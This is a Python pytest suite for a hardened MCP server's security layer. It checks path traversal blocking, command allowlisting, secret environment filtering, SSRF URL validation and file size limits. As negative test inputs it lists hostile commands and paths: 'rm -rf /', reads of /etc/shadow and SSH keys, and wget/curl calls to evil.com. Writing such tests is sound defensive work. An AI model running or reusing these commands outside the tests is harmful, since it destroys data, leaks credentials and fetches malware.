"""
Comprehensive security testing suite for hardened MCP server functions
Created: 26/10/25
By: Daniel Potter

Test suite validates all security enhancements implemented across the MCP server:
- Command injection protection
- Path traversal prevention
- Environment variable filtering
- URL validation and SSRF protection
- File access controls

References:
OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
Python Security Testing: https://python-security.readthedocs.io/
"""

import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch
import sys

# Add src to path for testing
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../src"))

from mcp_server.utils.security import (
    safe_read_file,
    safe_write_file,
    run_command,
    secure_run_command,
    validate_file_path,
    filter_sensitive_environment,
    get_security_config,
    _validate_command_security,
    _is_path_allowed,
    _is_path_forbidden,
)


class TestPathTraversalProtection:
    """Test suite for path traversal attack prevention"""

    def test_path_traversal_attacks_blocked(self):
        """Test that common path traversal patterns are blocked"""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "~/.ssh/id_rsa",
            "../../../../root/.bash_history",
        ]

        for dangerous_path in dangerous_paths:
            with pytest.raises(
                ValueError,
                match="Access denied|Invalid file path|outside allowed directories",
            ):
                safe_read_file(dangerous_path)

    def test_allowed_paths_work(self):
        """Test that files in allowed directories can be accessed"""
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt") as f:
            f.write("test content")
            temp_path = f.name

        try:
            # Should work for files in current working directory
            content = safe_read_file(temp_path)
            assert content == "test content"
        finally:
            os.unlink(temp_path)

    def test_path_validation_function(self):
        """Test the standalone path validation function"""
        # Test valid path
        with tempfile.NamedTemporaryFile(delete=False) as f:
            temp_path = f.name

        try:
            result = validate_file_path(temp_path, "read")
            assert result["valid"] == True
            assert "All security checks passed" in result["checks"]
        finally:
            os.unlink(temp_path)

        # Test invalid path
        result = validate_file_path("/etc/passwd", "read")
        assert result["valid"] == False
        assert len(result["checks"]) > 0


class TestCommandInjectionProtection:
    """Test suite for command injection attack prevention"""

    def test_command_injection_attacks_blocked(self):
        """Test that command injection attempts are blocked"""
        malicious_commands = [
            "ls; rm -rf /",
            "echo hello && cat /etc/passwd",
            "ls | grep secret > /tmp/stolen_data",
            "echo test `cat ~/.ssh/id_rsa`",
            "echo test $(cat /etc/shadow)",
            "ls & wget http://evil.com/malware.sh",
            "echo hello > /dev/null; curl evil.com",
        ]

        for malicious_cmd in malicious_commands:
            result = run_command(malicious_cmd)
            assert result["success"] == False
            assert (
                "security" in result.get("error", "").lower()
                or result.get("security_check") == "FAILED"
            )

    def test_allowed_commands_work(self):
        """Test that allowlisted commands execute successfully"""
        safe_commands = ["pwd", "echo hello", "ls", "git status"]

        for safe_cmd in safe_commands:
            result = run_command(safe_cmd)
            # Command may fail for legitimate reasons (no git repo, etc.)
            # but should not fail due to security validation
            if not result["success"]:
                # Check that failure is not due to security validation
                assert "security" not in result.get("error", "").lower()

    def test_command_validation_function(self):
        """Test the command validation logic"""
        # Test valid command
        result = _validate_command_security("git status")
        assert result["valid"] == True
        assert result["command_name"] == "git"

        # Test invalid command
        result = _validate_command_security("rm -rf /")
        assert result["valid"] == False
        assert "not in allowlist" in result["error"]

        # Test command with shell metacharacters
        result = _validate_command_security("ls && cat /etc/passwd")
        assert result["valid"] == False
        assert "Dangerous character" in result["error"]


class TestEnvironmentFiltering:
    """Test suite for environment variable protection"""

    @patch.dict(
        os.environ,
        {
            "API_KEY": "secret123",
            "SECRET_TOKEN": "supersecret",
            "GITHUB_TOKEN": "github_secret",
            "NORMAL_VAR": "safe_value",
            "PATH": "/usr/bin:/bin",
            "MY_PASSWORD": "secret_pass",
        },
    )
    def test_sensitive_environment_variables_filtered(self):
        """Test that sensitive environment variables are filtered out"""
        filtered_env = filter_sensitive_environment()

        # Sensitive variables should be filtered out
        assert "API_KEY" not in filtered_env
        assert "SECRET_TOKEN" not in filtered_env
        assert "GITHUB_TOKEN" not in filtered_env
        assert "MY_PASSWORD" not in filtered_env

        # Safe variables should remain
        assert "NORMAL_VAR" in filtered_env
        assert "PATH" in filtered_env
        assert filtered_env["NORMAL_VAR"] == "safe_value"


class TestFileSizeProtection:
    """Test suite for file size limit protection"""

    def test_large_file_reading_blocked(self):
        """Test that excessively large files are blocked"""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            # Create a file larger than default limit (1MB)
            large_content = "A" * (2 * 1024 * 1024)  # 2MB
            f.write(large_content)
            temp_path = f.name

        try:
            with pytest.raises(ValueError, match="File too large"):
                safe_read_file(temp_path)
        finally:
            os.unlink(temp_path)

    def test_custom_size_limit_respected(self):
        """Test that custom size limits are respected"""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            content = "A" * 1000  # 1KB
            f.write(content)
            temp_path = f.name

        try:
            # Should work with higher limit
            result = safe_read_file(temp_path, max_size=2000)
            assert len(result) == 1000

            # Should fail with lower limit
            with pytest.raises(ValueError, match="File too large"):
                safe_read_file(temp_path, max_size=500)
        finally:
            os.unlink(temp_path)


class TestSecureWriteOperations:
    """Test suite for secure file writing"""

    def test_write_to_allowed_directories(self):
        """Test that writing to allowed directories works"""
        with tempfile.TemporaryDirectory() as temp_dir:
            test_file = os.path.join(temp_dir, "test.txt")
            test_content = "test write content"

            # Should succeed in temp directory (within cwd)
            safe_write_file(test_file, test_content)

            # Verify content was written
            with open(test_file, "r") as f:
                assert f.read() == test_content

    def test_write_to_forbidden_paths_blocked(self):
        """Test that writing to system paths is blocked"""
        forbidden_paths = [
            "/etc/passwd",
            "/root/malicious.txt",
            "C:\\Windows\\System32\\malicious.dll",
        ]

        for forbidden_path in forbidden_paths:
            with pytest.raises(
                ValueError, match="Access denied|outside allowed directories"
            ):
                safe_write_file(forbidden_path, "malicious content")


class TestURLValidation:
    """Test suite for URL security validation (SSRF protection)"""

    def test_local_urls_blocked(self):
        """Test that local/private network URLs are blocked"""
        from mcp_server.tools.search_tools import _validate_url_security

        dangerous_urls = [
            "http://localhost:8080/admin",
            "http://127.0.0.1:22/ssh",
            "http://10.0.0.1/internal",
            "http://192.168.1.1/router",
            "http://172.16.0.1/private",
            "file:///etc/passwd",
            "ftp://internal.server/files",
        ]

        for dangerous_url in dangerous_urls:
            result = _validate_url_security(dangerous_url)
            assert result["valid"] == False
            assert "blocked" in result["error"] or "not allowed" in result["error"]

    def test_safe_urls_allowed(self):
        """Test that safe external URLs are allowed"""
        from mcp_server.tools.search_tools import _validate_url_security

        safe_urls = [
            "https://www.google.com",
            "https://api.github.com/repos",
            "http://httpbin.org/get",
            "https://jsonplaceholder.typicode.com/posts",
        ]

        for safe_url in safe_urls:
            result = _validate_url_security(safe_url)
            assert result["valid"] == True


class TestSecurityConfiguration:
    """Test suite for security configuration and status"""

    def test_security_config_accessible(self):
        """Test that security configuration can be retrieved"""
        config = get_security_config()

        # Verify expected configuration keys
        assert "allowed_commands" in config
        assert "hardening_enabled" in config
        assert "security_version" in config
        assert config["hardening_enabled"] == True
        assert config["command_allowlist_active"] == True

    def test_allowed_commands_list(self):
        """Test that allowed commands list is properly configured"""
        config = get_security_config()
        allowed_commands = config["allowed_commands"]

        # Should include basic safe commands
        expected_commands = ["git", "ls", "pwd", "echo", "cat"]
        for cmd in expected_commands:
            assert cmd in allowed_commands


class TestBackwardCompatibility:
    """Test suite for backward compatibility features"""

    def test_secure_run_command_dangerous_mode(self):
        """Test that dangerous mode provides backward compatibility"""
        # Test that dangerous mode allows broader command execution
        # while still filtering environment variables
        result = secure_run_command("echo $USER", allow_dangerous=True)

        # Should execute but with security warnings
        if result["success"]:
            assert "BYPASSED" in result.get("security_check", "")
            assert "warning" in result or "Security Warning" in str(result)


class TestIntegrationSecurity:
    """Integration tests for complete security validation"""

    def test_file_operations_security_integration(self):
        """Test that file operations properly integrate with security functions"""
        # This would test the actual tool handlers if we had a test client
        # For now, we verify the security functions are properly imported and used
        from mcp_server.tools.file_operations import handle_file_operations
        import asyncio

        # Test invalid path handling
        async def test_invalid_path():
            result = await handle_file_operations(
                "read_file", {"file_path": "/etc/passwd"}
            )
            assert len(result) == 1
            assert "Security Error" in result[0].text

        asyncio.run(test_invalid_path())

    def test_command_execution_security_integration(self):
        """Test that command execution properly integrates with security functions"""
        from mcp_server.tools.system_commands import handle_system_commands
        import asyncio

        # Test malicious command handling
        async def test_malicious_command():
            result = await handle_system_commands(
                "run_command", {"command": "ls && cat /etc/passwd"}
            )
            assert len(result) == 1
            assert (
                "Security Error" in result[0].text or "failed" in result[0].text.lower()
            )

        asyncio.run(test_malicious_command())


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v", "--tb=short"])
